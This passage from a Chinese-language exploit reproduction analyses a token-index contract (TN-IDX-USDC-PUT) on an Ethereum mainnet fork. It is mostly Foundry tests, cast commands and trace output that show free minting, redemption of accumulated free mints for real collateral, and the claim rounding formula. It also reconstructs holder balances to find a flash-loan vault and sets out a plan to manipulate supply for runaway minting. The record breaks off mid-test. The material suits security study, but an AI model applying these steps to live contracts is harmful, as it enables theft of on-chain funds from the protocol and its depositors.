    └─ ← [Revert] ERC20: transfer amount exceeds allowance
````

失败了

根据前面的公式  `requiredAmount = vaultBalance * mintAmount / totalSupply;`

`mint(4)` 免费的条件是 `BTCVaultBalance × 4 < totalSupply`

当前：BTCVaultBalance × 4 = 49716431048 × 4 = 198865724192 , 还差 198865724192 - 153054600572 = 45811123620, 每次挖3个, 还需要挖 45811123620/3 = 15270374540 次

所以,放大免费挖币量是不可行的



#### 得到的 Index Token 能换回真实 Vault Token的吗?

```	
anvil --fork-url "$RPC_ETH" --fork-block-number 25323328
## 重启fork
```

```
cast send "$VICTIM" "mint(uint256)" 3 --private-key "$TESTER_KEY" --rpc-url "$LOCAL_RPC"
## 免费挖了3个

cast call "$VICTIM" "balanceOf(address)(uint256)" "$TESTER" --rpc-url "$LOCAL_RPC"
## 确认得到了 3个

cast call "$VICTIM" "claim(uint256)" 3 --from "$TESTER" --trace --rpc-url "$LOCAL_RPC"
## 尝试换行
```

查看trace 

```
Traces:
  [101966] 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7::claim(3)
    ├─ emit Transfer(from: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, to: 0x0000000000000000000000000000000000000000, value: 3)
    ├─ [7288] 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0)
    │   ├─ emit Transfer(from: 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, to: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, value: 0)
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [7288] 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0)
    │   ├─ emit Transfer(from: 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, to: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, value: 0)
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [7288] 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0)
    │   ├─ emit Transfer(from: 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, to: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, value: 0)
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [7288] 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0)
    │   ├─ emit Transfer(from: 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, to: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, value: 0)
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [7288] 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0)
    │   ├─ emit Transfer(from: 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, to: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, value: 0)
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    └─ ← [Stop]

```

注意到 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59::transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0) 以及其他几个也一样, 实际转出 0

所以: 免费造出的少量 Index Token，本身无法立即兑换出底层资产

但是连续调用后, 如果获得足够多的token, 是能换成真实资产的

```solidity
    function test_MintProbe_AccumulatedFreeMintsAreRedeemableForRealCollateral() public {
        address attacker = makeAddr("attacker_accumulator");
        uint256 rounds = 300; // 300 x mint(3), each individually free at this block's ratios

        for (uint256 i = 0; i < rounds; i++) {
            vm.prank(attacker);
            TN.mint(3);
        }

        uint256 minted = TN.balanceOf(attacker);
        console.log("accumulated free-minted TN balance:", minted);
        assertEq(minted, rounds * 3);

        address[] memory vaultList = _allVaults();
        uint256[] memory before = new uint256[](vaultList.length);
        for (uint256 i = 0; i < vaultList.length; i++) {
            before[i] = IERC20Min(vaultList[i]).balanceOf(attacker);
        }

        vm.prank(attacker);
        TN.claim(minted);

        uint256 totalRealUnitsExtracted;
        for (uint256 i = 0; i < vaultList.length; i++) {
            uint256 received = IERC20Min(vaultList[i]).balanceOf(attacker) - before[i];
            console.log("vault", vaultList[i], "real units received for zero real cost:", received);
            totalRealUnitsExtracted += received;
        }
        console.log("TOTAL real vault-token units extracted:", totalRealUnitsExtracted);

        assertGt(
            totalRealUnitsExtracted,
            0,
            "accumulated free mints should be redeemable for real, nonzero collateral"
        );
    }
```

Logs:
  accumulated free-minted TN balance: 900
  vault 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59 real units received for zero real cost: 292
  vault 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae real units received for zero real cost: 140
  vault 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8 real units received for zero real cost: 37
  vault 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF real units received for zero real cost: 101
  vault 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71 real units received for zero real cost: 58
  TOTAL real vault-token units extracted: 628



### 现状分析

目前已经确认：

```text
免费 mint：存在
当前最多免费 mint 3 个 Index Token
claim(3)：换回 0 个 Vault Token
依靠循环 mint(3) 扩大：理论可行，但需要约 152 亿轮
```

前面已经得出，`mint(4)` 免费需要满足：

```text
BTCVaultBalance × 4 < IndexTotalSupply
```

推广到任意数量 `x`：

```text
BTCVaultBalance × x < IndexTotalSupply
```

也就是：

```text
x < IndexTotalSupply / BTCVaultBalance
```

因此，免费 mint 上限取决于：

```text
Index Token totalSupply / Vault Token balance
```

想提高免费 mint 上限，理论上只有两个方向：

```text
增大 Index Token totalSupply
减小 Vault Token balance
```

#### 方案一：通过 mint 增大 totalSupply

`mint()` 可以增加 Index Token 的 `totalSupply`。

但是在当前状态下，每次最多只能免费 mint 3 个。实验已经证明，依靠不断执行 `mint(3)` 推高 `totalSupply`，需要约 152 亿轮才能让 `mint(4)` 免费。

这条路线在数学上成立，但现实中不可执行。

#### 方案二：通过 claim 改变系统状态

除了 `mint()`，另一个会直接改变计价基础的公开函数是：

```solidity
claim(uint256)
```

前面的黑盒测试已经确认，`claim(amount)` 会：

```text
销毁调用者的 Index Token
从 Victim 中转出五种 Vault Token
```

因此，执行 `claim()` 后，两个关键值都会发生变化：

```text
Index Token totalSupply 减少
Vault Token balance 也减少
```

表面看，`claim()` 同时减小分母和分子，似乎不一定能提高免费 mint 上限。

真正需要关注的是：

> claim 之后，Vault Token balance 和 Index Token totalSupply 分别减少多少？

如果两者完全按相同比例减少，那么：

```text
IndexTotalSupply / VaultTokenBalance
```

基本不变，免费 mint 上限也不会明显改变。

但如果由于整数除法和向下取整，`claim()` 能取走绝大部分 Vault Token，只留下极少量余额，同时仍保留少量 Index Token 供应量，那么这个比值可能突然变大。

例如系统被压缩成：

```text
Index totalSupply = 3
Vault Token balance = 1
```

此时：

```text
1 × 2 < 3
```

所以可以免费 mint 2 个。

mint 完成后：

```text
Index totalSupply: 3 → 5
Vault Token balance: 仍然是 1
```

下一轮免费 mint 上限进一步提高。

因此，研究 `claim()` 的目的不是单纯了解赎回功能，而是判断：

> 能否通过一次大额 claim，把系统压缩到 Vault Token 余额极低、但 Index Token 供应量仍不为零的状态，从而把原本缓慢的线性免费 mint，转变成快速扩大的循环。

所以接下来必须搞清楚 `claim(amount)` 的底层计价方式：

```text
claimAmount 与销毁的 Index Token 数量是什么关系？
claimAmount 与每种 Vault Token 转出数量是什么关系？
claim 后 totalSupply 剩多少？
claim 后每种 Vault Token balance 剩多少？
是否存在整数舍入导致的极端残余状态？
```

只有确定了 `claim()` 的计算规律，才能继续计算：

```text
为了构造可放大的状态，需要 claim 多少 Index Token
需要临时获得多少 Index Token
链上是否存在足够的可借数量
```



### claim(uint256) - 再次分析

前置条件:

1. 为了能反复调试, 所以肯定是本地fork
2. 要能调试, 肯定需要我们掌控的账户上得有 Index Token (TN-IDX-USDC-PUT)
   1. 方案1, fork后, 在本地环境利用anvil给我们的"虚拟ETH"进行购买, 但我们就需要找能买到该token的交易池
   2. 方案2, 找到市场上谁持有大量token, fork到本地后, 在本地冒充这个人转账转大量token给我们自己的账户

我们使用方案2

#### 找到持有大量 index token 的 holder

注意: 到目前为止我们一直是基于 BLOCK 25323328 (ATTACK TX - 1) 进行分析. 所以不能看etherscan的持仓数据, 它是最新的当前持仓. 我们要的是 BLOCK 25323328 上的持仓数据

##### 持仓数据重建

算法: 在victim合约创建后的BLOCK 到 BLOCK 25323328 这个范围内: [DEPLOY_BLOCK, PRE_BLOCK(25323328)], 累计 Victim 发出的所有 ERC20 Transfer:

```
balance_of_from -= value
balance_of_to += value
```

最后按余额倒序，就能得到BLOCK 25323328前的真实Holder排名

注意: 以防有成千上万个holder, 实际执行过程中, 我们只查找排行前20的holder

victim deploy BLOCK: 14668794, 可以通过得到:

```
curl -s "https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getcontractcreation&contractaddresses=$VICTIM&apikey=$APIKEY_ETHERSCAN" | jq '.result[0] | {contractCreator,txHash,blockNumber}'
{
  "contractCreator": "0x4a4c7c5549359b9fff0137bb3ec4d48c4aa79cc7",
  "txHash": "0x5fe942c5d09bd3b427c5d8c0ecabd0d2468d4452b0b7f32f87ca358c0c997132",
  "blockNumber": "14668794"
}
```

所以范围是 [14668794, 25323328]

使用 [dune](https://docs.dune.com/query-engine/overview) 查询

```sql
WITH transfers AS (
    SELECT
        block_number,
        block_time,
        tx_hash,
        "index" AS log_index,

        varbinary_substring(topic1, 13, 20) AS from_address,
        varbinary_substring(topic2, 13, 20) AS to_address,

        CAST(
            varbinary_to_uint256(data)
            AS DECIMAL(38, 0)
        ) AS value_raw

    FROM ethereum.logs

    WHERE block_number BETWEEN 14668794 AND 25323328

      AND contract_address
          = 0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7

      AND topic0
          = 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
),

address_flows AS (
    -- Outgoing side
    SELECT
        from_address AS holder,
        CAST(0 AS DECIMAL(38, 0)) AS received_raw,
        value_raw AS sent_raw,
        block_number,
        block_time

    FROM transfers

    WHERE from_address
          != 0x0000000000000000000000000000000000000000

    UNION ALL

    -- Incoming side
    SELECT
        to_address AS holder,
        value_raw AS received_raw,
        CAST(0 AS DECIMAL(38, 0)) AS sent_raw,
        block_number,
        block_time

    FROM transfers

    WHERE to_address
          != 0x0000000000000000000000000000000000000000
),

balances AS (
    SELECT
        holder,

        SUM(received_raw) AS received_raw,
        SUM(sent_raw) AS sent_raw,

        SUM(received_raw) - SUM(sent_raw) AS balance_raw,

        MIN(block_number) AS first_activity_block,
        MAX(block_number) AS last_activity_block,

        MIN(block_time) AS first_activity_time,
        MAX(block_time) AS last_activity_time

    FROM address_flows

    GROUP BY holder
),

positive_holders AS (
    SELECT
        holder,
        received_raw,
        sent_raw,
        balance_raw,
        first_activity_block,
        last_activity_block,
        first_activity_time,
        last_activity_time

    FROM balances

    WHERE balance_raw > 0
)

SELECT
    row_number() OVER (
        ORDER BY balance_raw DESC, holder ASC
    ) AS holder_rank,

    holder,
    balance_raw,
    received_raw,
    sent_raw,

    first_activity_block,
    last_activity_block,
    first_activity_time,
    last_activity_time

FROM positive_holders

ORDER BY
    balance_raw DESC,
    holder ASC

LIMIT 20;
```

得到

```
holder_rank	holder	balance_raw	received_raw	sent_raw	first_activity_block	last_activity_block	first_activity_time	last_activity_time
1	0x075da7e9efea6813ab0b2680423df75150120d12	153054600572	16571321126033	16418266525461	14668938	24471960	2022-04-27 21:39:00.000 UTC	2026-02-16 21:06:11.000 UTC
```



**区块** **`25323328`** **结束时，不存在所谓“前 20 holder 排名”。只有一个非零 holder:0x075da7e9efea6813ab0b2680423df75150120d12  它的余额是 : 153054600572**



调试查询过程我这里省略了, 但是提供调试我们得到了如下结论:

```
其他 7 个出现过的地址全部是流程节点或历史中转地址，净余额均为零。

还有一个值得警惕的地方：这个代币的行为不像普通 ERC-20。它一共只有 8 个参与地址，并且：

115 次 MINT
17 次 BURN
132 次普通 TRANSFER

恰好满足：

115 + 17 = 132

金额也满足：

MINT 总额 + BURN 总额 = TRANSFER 总额

这几乎明示了它的事件模式：

铸造：0x0 → 中转地址 → 0x075da7...
销毁：0x075da7... → 中转地址 → 0x0

也就是说，`0x075da7e9efea6813ab0b2680423df75150120d12` 很可能不是普通用户钱包，而是该资产系统的核心托管、金库、桥接或记账合约。
```

##### `0x075da7e9efea6813ab0b2680423df75150120d12`

探测得知 0x075dA7e9EFEA6813aB0B2680423df75150120d12 是一个unverified EIP-1967 Proxy 

他指向一个unverified Contract 0x1CF0d5AB75d82DC6b8AFc6d37D0Cd8aF4c6BeFF6 

Resolved Functions — 0x075dA7e9EFEA6813aB0B2680423df75150120d12
(ABI rows are confirmed via a verified contract ABI. Guess rows are signature-database matches on a raw selector found in bytecode — the actual name may differ due to selector collisions.)

Detected · Proxy

| Source | Selector   | Signature                       |
| ------ | ---------- | ------------------------------- |
| Guess  | 0x3659cfe6 | upgradeTo(address)              |
| Guess  | 0x4f1ef286 | upgradeToAndCall(address,bytes) |
| Guess  | 0x5c60da1b | implementation()(address)       |
| Guess  | 0xd1f57894 | initialize(address,bytes)       |
| Guess  | 0xf851a440 | admin()(address)                |

Detected · Implementation

| Source | Selector   | Signature                                                    |
| ------ | ---------- | ------------------------------------------------------------ |
| Guess  | 0x06fdde03 | name()(string)                                               |
| Guess  | 0x095ea7b3 | approve(address,uint256)(bool)                               |
| Guess  | 0x0afbcdc9 | getScaledUserBalanceAndSupply(address)                       |
| Guess  | 0x0bd7ad3b | ATOKEN_REVISION()                                            |
| Guess  | 0x156e29f6 | mint(address,uint256,uint256)                                |
| Guess  | 0x18160ddd | totalSupply()(uint256)                                       |
| Guess  | 0x183fb413 | 0x183fb413(address,address,address,address,uint8,bytes,bytes,bytes) |
| Guess  | 0x1da24f3e | scaledBalanceOf(address)                                     |
| Guess  | 0x23b872dd | transferFrom(address,address,uint256)(bool)                  |
| Guess  | 0x30adf81f | PERMIT_TYPEHASH()                                            |
| Guess  | 0x313ce567 | decimals()(uint8)                                            |
| Guess  | 0x3644e515 | DOMAIN_SEPARATOR()                                           |
| Guess  | 0x39509351 | increaseAllowance(address,uint256)                           |
| Guess  | 0x4efecaa5 | transferUnderlyingTo(address,uint256)                        |
| Guess  | 0x70a08231 | balanceOf(address)(uint256)                                  |
| Guess  | 0x7535d246 | POOL()                                                       |
| Guess  | 0x75d26413 | getIncentivesController()                                    |
| Guess  | 0x78160376 | EIP712_REVISION()                                            |
| Guess  | 0x7df5bd3b | mintToTreasury(uint256,uint256)                              |
| Guess  | 0x88dd91a1 | handleRepayment(address,uint256)                             |
| Guess  | 0x95d89b41 | symbol()(string)                                             |
| Guess  | 0xa457c2d7 | decreaseAllowance(address,uint256)                           |
| Guess  | 0xa9059cbb | transfer(address,uint256)(bool)                              |
| Guess  | 0xae167335 | RESERVE_TREASURY_ADDRESS()                                   |
| Guess  | 0xb16a19de | UNDERLYING_ASSET_ADDRESS()                                   |
| Guess  | 0xb1bf962d | scaledTotalSupply()                                          |
| Guess  | 0xb9844d8d | _nonces(address)                                             |
| Guess  | 0xd505accf | 0xd505accf(address,address,uint256,uint256,uint8,uint256,uint256) |
| Guess  | 0xd7020d0a | burn(address,address,uint256,uint256)                        |
| Guess  | 0xdd62ed3e | allowance(address,address)(uint256)                          |
| Guess  | 0xf866c319 | transferOnLiquidation(address,address,uint256)               |



##### `0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA`

**<span style="color: red;">意外收获</span>**

注意上一步表格中的 transferUnderlyingTo 和 POOL 函数 ,这是`闪电贷金库的特征码`

调用POOL()函数返回

0x0000000000000000000000002ca7641b841a79cc70220ce838d0b9f8197accda

`0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA` 是一个代理合约, 实现合约是 0xEF6c62D2ac4B0980599668F883257175bd254cB3

继续探测

Resolved Functions — 0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA
(ABI rows are confirmed via a verified contract ABI. Guess rows are signature-database matches on a raw selector found in bytecode — the actual name may differ due to selector collisions.)

Detected · Proxy

| Source | Selector   | Signature                       |
| ------ | ---------- | ------------------------------- |
| Guess  | 0x3659cfe6 | upgradeTo(address)              |
| Guess  | 0x4f1ef286 | upgradeToAndCall(address,bytes) |
| Guess  | 0x5c60da1b | implementation()(address)       |
| Guess  | 0xd1f57894 | initialize(address,bytes)       |
| Guess  | 0xf851a440 | admin()(address)                |

Detected · Implementation

| Source | Selector   | Signature                                                    |
| ------ | ---------- | ------------------------------------------------------------ |
| Guess  | 0x00a718a9 | liquidationCall(address,address,address,uint256,bool)        |
| Guess  | 0x074b2e43 | FLASHLOAN_PREMIUM_TOTAL()                                    |
| Guess  | 0x1d2118f9 | setReserveInterestRateStrategyAddress(address,address)       |
| Guess  | 0x35ea6a75 | getReserveData(address)                                      |
| Guess  | 0x386497fd | getReserveNormalizedVariableDebt(address)                    |
| Guess  | 0x4417a583 | getUserConfiguration(address)                                |
| Guess  | 0x573ade81 | repay(address,uint256,uint256,address)                       |
| Guess  | 0x5a3b74b9 | setUserUseReserveAsCollateral(address,bool)                  |
| Guess  | 0x5c975abb | paused()                                                     |
| Guess  | 0x69328dec | withdraw(address,uint256,address)                            |
| Guess  | 0x7a708e92 | initReserve(address,address,address,address,address)         |
| Guess  | 0x8afaff02 | LENDINGPOOL_REVISION()                                       |
| Guess  | 0x94ba89a2 | swapBorrowRateMode(address,uint256)                          |
| Guess  | 0xa415bcad | borrow(address,uint256,uint256,uint16,address)               |
| Guess  | 0xab9c4b5d | flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16) |
| Guess  | 0xadae6781 | disableReserveAsCollateral(address,address)                  |
| Guess  | 0xb8d29276 | setConfiguration(address,uint256)                            |
| Guess  | 0xbedb86fb | setPause(bool)                                               |
| Guess  | 0xbf92857c | getUserAccountData(address)                                  |
| Guess  | 0xc44b11f7 | getConfiguration(address)                                    |
| Guess  | 0xc4d66de8 | initialize(address)                                          |
| Guess  | 0xcd112382 | rebalanceStableBorrowRate(address,address)                   |
| Guess  | 0xd15e0053 | getReserveNormalizedIncome(address)                          |
| Guess  | 0xd1946dbc | getReservesList()                                            |
| Guess  | 0xd5ed3933 | finalizeTransfer(address,address,address,uint256,uint256,uint256) |
| Guess  | 0xe82fec2f | MAX_STABLE_RATE_BORROW_SIZE_PERCENT()                        |
| Guess  | 0xe8eda9df | deposit(address,uint256,address,uint16)                      |
| Guess  | 0xf8119d51 | MAX_NUMBER_RESERVES()                                        |
| Guess  | 0xfe65acfe | getAddressesProvider()                                       |

它是一个闪电贷入口, 也就是说我们上一步不仅仅找到了一个holder大户, 顺便找到了闪电贷入口, 这个大户就是这个闪电贷的金库



#### 探测 claim 算法

我们在 claim首次探测的时候, 已经得到了框架

```
0 0 -> CALL buildinEOA -> victim . claim(0)
  0 EVENT victim.Transfer (from=buildinEOA, to=0x0000000000000000000000000000000000000000, value=0)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=victim, to=buildinEOA, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=victim, to=buildinEOA, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=victim, to=buildinEOA, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=victim, to=buildinEOA, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=victim, to=buildinEOA, value=0)
```

我们现在要将传入的0换成其他数字, 来探测计算公式

创建一个 Foundry 项目 

```
    ITNIndexPut constant TN = ITNIndexPut(0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7);
    address constant INDEX_USDC = 0x075dA7e9EFEA6813aB0B2680423df75150120d12;
    uint256 constant FORK_BLOCK = 25323328;
```

使用

```solidity
vm.prank(INDEX_USDC);
TN.transfer(address(this), supply);
```

来冒充INDEX_USDC给我们转账, 以便我们获得INDEX token, 以方便测试



STEP 1: 收集数据点

调用claim(amount)的时候选 amount 的原则：覆盖从极小到极大的范围，让任何潜在规律都有机会暴露。

- 1/2/3：最微量，看有没有最小阈值
- 10/100/1000：10 的幂次，方便人眼验证比例关系
- 1000000：足够大，能区分两种分母候选（如果除数差 1，在小量时 floor 结果相同）
- 153054600 (~totalSupply/1000)：中等量，和极小量对比
- totalSupply-3 / totalSupply-1 / totalSupply：极端值，看边界行为

用上面这些值去调用claim, 过程中打日志, 能得到(下面的V0...V4 是 vault[0]...vault[4])

```
forge test --match-test test_Step1_CollectTransferData -vv

Ran 1 test for test/ClaimReasoning.t.sol:ClaimReasoningTest
[PASS] test_Step1_CollectTransferData() (gas: 4076511)
Logs:
  === INITIAL STATE (STEP 1) ===
  totalSupply 153054600572
  vault[0] cachedBalance 49716431048
  vault[1] cachedBalance 23955277334
  vault[2] cachedBalance 6378688542
  vault[3] cachedBalance 17186382410
  vault[4] cachedBalance 10028704388

  === OBSERVATION MATRIX ===
  For each amount, recording 5 vault transfer values
  --- claim amount = 1 ---
  V0_transfer 0
  V1_transfer 0
  V2_transfer 0
  V3_transfer 0
  V4_transfer 0

  --- claim amount = 2 ---
  V0_transfer 0
  V1_transfer 0
  V2_transfer 0
  V3_transfer 0
  V4_transfer 0


  --- claim amount = 3 ---
  V0_transfer 0
  V1_transfer 0
  V2_transfer 0
  V3_transfer 0
  V4_transfer 0

  --- claim amount = 10 ---
  V0_transfer 3
  V1_transfer 1
  V2_transfer 0
  V3_transfer 1
  V4_transfer 0

  --- claim amount = 100 ---
  V0_transfer 32
  V1_transfer 15
  V2_transfer 4
  V3_transfer 11
  V4_transfer 6

  --- claim amount = 1000 ---
  V0_transfer 324
  V1_transfer 156
  V2_transfer 41
  V3_transfer 112
  V4_transfer 65

  --- claim amount = 1000000 ---
  V0_transfer 324828
  V1_transfer 156514
  V2_transfer 41675
  V3_transfer 112289
  V4_transfer 65523

  --- claim amount = 153054600 ---
  V0_transfer 49716430
  V1_transfer 23955277
  V2_transfer 6378688
  V3_transfer 17186382
  V4_transfer 10028704

  --- claim amount = 153054600569 ---
  V0_transfer 49716431047
  V1_transfer 23955277333
  V2_transfer 6378688541
  V3_transfer 17186382409
  V4_transfer 10028704387

  --- claim amount = 153054600571 ---
  V0_transfer 49716431047
  V1_transfer 23955277333
  V2_transfer 6378688541
  V3_transfer 17186382409
  V4_transfer 10028704387

  --- claim amount = 153054600572 ---
  V0_transfer 49716431048
  V1_transfer 23955277334
  V2_transfer 6378688542
  V3_transfer 17186382410
  V4_transfer 10028704388
```



STEP 2:  从数据中找规律

以 amount=10 为例：[3, 1, 0, 1, 0] 它们的比例是 3 : 1 : 0 : 1 : 0

已知 5 个 vault 的余额是：V0=49716431048, V1=23955277334, V2=6378688542, V3=17186382410, V4=10028704388

比例大约是 `497 : 239 : 64 : 172 : 100`, 和 `3 : 1 : 0 : 1 : 0` 的排序完全一致（V0 最大，V2 最小）。

所以很自然地推测：transfer 值正比于 vault 余额

```
transfer_i ∝ vaultBalance_i
```

以 V0 为例，amount=10 时 transfer=3。`3 / 49716431048 ≈ 6.03 × 10^-11`。这个值在不同 amount 下会变，所以比例系数应该和 amount 有关。

尝试 `vaultBalance × amount`：

```
V0: 49716431048 × 10 = 497164310480
V1: 23955277334 × 10 = 239552773340
```

如果公式是 `vaultBalance × amount / 某个分母`，那分母必须是一个固定值。totalSupply=153054600572 是候选，因为 mint 里已经见过这个角色。

验证： 

```
V0: 497164310480 / 153054600572 = 3.248... → floor 3 ✓ 

V1: 239552773340 / 153054600572 = 1.565... → floor 1 ✓ 

V2: 63786885420 / 153054600572 = 0.416... → floor 0 ✓ 

V3: 171863824100 / 153054600572 = 1.122... → floor 1 ✓ 

V4: 100287043880 / 153054600572 = 0.655... → floor 0 ✓
```

5 个全中。但这只是一个数据点，可能在其它 amount 上碰巧吻合。用全部 7 个 amount × 5 vault = 35 个数据点验证——全部精确匹配。

所以暂时保留假设 `share_i = floor(vaultBalance_i × amount / totalSupply)`



STEP 3: 分母是哪个 totalSupply？

上面的验证用的是销毁前的 totalSupply（153054600572）。但 claim 内部是先 burn 还是先计算？如果先 burn，那分母就应该是 `totalSupply - amount`

这两个候选公式在小 amount 时 floor 结果相同，因为分子很小，分母差一点点不会跨越整数边界。需要找一个足够大的 amount 使两者产生不同结果。

怎么找？

两个公式差值为：

```
Δ = vaultBalance × amount / totalSupply  -  vaultBalance × amount / (totalSupply - amount)
```

要让 floor 不同，需要 Δ ≥ 1。近似：

```
Δ ≈ vaultBalance × amount × amount / totalSupply²
Δ ≥ 1 → amount ≥ totalSupply / sqrt(vaultBalance)
```

对 V0：`amount ≥ 153054600572 / sqrt(49716431048) ≈ 153054600572 / 222972 ≈ 686000`。

取 `amount = 1000000`，预测：

- 销毁前分母：`49716431048 × 1000000 / 153054600572 = 324828`
- 销毁后分母：`49716431048 × 1000000 / 153053600572 = 324830`

```solidity
    function test_Step2_RuleOutAfterBurnDenominator() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();
        uint256[] memory cacheBal = new uint256[](vaultList.length);
        for (uint256 i = 0; i < vaultList.length; i++) {
            (,, cacheBal[i],) = _vaultInfo(vaultList[i]);
        }

        uint256 amount = 1000000;

        uint256[] memory userBalBefore = new uint256[](vaultList.length);
        for (uint256 i = 0; i < vaultList.length; i++) {
            userBalBefore[i] = IERC20Min(vaultList[i]).balanceOf(address(this));
        }

        TN.claim(amount);

        console.log("=== DENOMINATOR DISCRIMINATION (STEP 2) ===");
        console.log("claim amount", amount);
        console.log("totalSupply (before burn)", supply);
        console.log("");

        for (uint256 i = 0; i < vaultList.length; i++) {
            uint256 observed = IERC20Min(vaultList[i]).balanceOf(address(this)) - userBalBefore[i];
            uint256 predA = (cacheBal[i] * amount) / supply;              // before-burn denominator
            uint256 predB = (cacheBal[i] * amount) / (supply - amount);   // after-burn denominator

            console.log("vault", i, vaultList[i]);
            console.log("  observed", observed);
            console.log("  pred_before_burn", predA, predA == observed ? "MATCH" : "WRONG");
            console.log("  pred_after_burn ", predB, predB == observed ? "MATCH" : "WRONG");

            assertEq(observed, predA, "candidate A (before-burn denominator) must match");
        }

        // Verify test has distinguishing power
        bool distinguishable = false;
        for (uint256 i = 0; i < vaultList.length; i++) {
            uint256 predA = (cacheBal[i] * amount) / supply;
            uint256 predB = (cacheBal[i] * amount) / (supply - amount);
            if (predA != predB) {
                distinguishable = true;
                break;
            }
        }
        assertTrue(distinguishable, "amount must be large enough to distinguish A from B");
        console.log("");
        console.log("STEP 2 PASSED: denominator = totalSupply before burn (not after)");
    }
```



```
forge test --match-test test_Step2_RuleOutAfterBurnDenominator  -vv

Ran 1 test for test/ClaimReasoning.t.sol:ClaimReasoningTest
[PASS] test_Step2_RuleOutAfterBurnDenominator() (gas: 360745)
Logs:
  === DENOMINATOR DISCRIMINATION (STEP 2) ===
  claim amount 1000000
  totalSupply (before burn) 153054600572

  vault 0 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59
    observed 324828
    pred_before_burn 324828 MATCH
    pred_after_burn  324830 WRONG
  vault 1 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae
    observed 156514
    pred_before_burn 156514 MATCH
    pred_after_burn  156515 WRONG
  vault 2 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8
    observed 41675
    pred_before_burn 41675 MATCH
    pred_after_burn  41676 WRONG
  vault 3 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF
    observed 112289
    pred_before_burn 112289 MATCH
    pred_after_burn  112289 MATCH
  vault 4 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71
    observed 65523
    pred_before_burn 65523 MATCH
    pred_after_burn  65524 WRONG

  STEP 2 PASSED: denominator = totalSupply before burn (not after)
```

所以是销毁前的 totalSupply



STEP 4: 余额用缓存还是实时？

mint 已知用 `vaults(address)` 缓存（裸 transfer 不改变 mint 对 required 的计算）。但 claim 呢？怎么测？ 制造「缓存 ≠ 实时」的状态，然后看 claim 跟哪个走。

1. 裸 transfer 1000000 个 V0 token 到黑洞地址（绕过 victim 合约，不触发缓存更新）
2. 确认：缓存=49716431048，实时=49715431048（差 1000000 ✓）
3. 执行 claim(200000)，观测 V0 transfer 值
   - 缓存预测：`49716431048 × 200000 / 153054600572 = 64965`
   - 实时预测：`49715431048 × 200000 / 153054600572 = 64964`

再用 amount=500000 交叉验证：

- 缓存预测=162414，实时预测=162410

```solidity
    function test_Step3_CacheOrLiveBalance() public {
        uint256 supply = TN.totalSupply();
        vm.prank(INDEX_USDC);
        TN.transfer(address(this), supply);

        address[] memory vaultList = _allVaults();
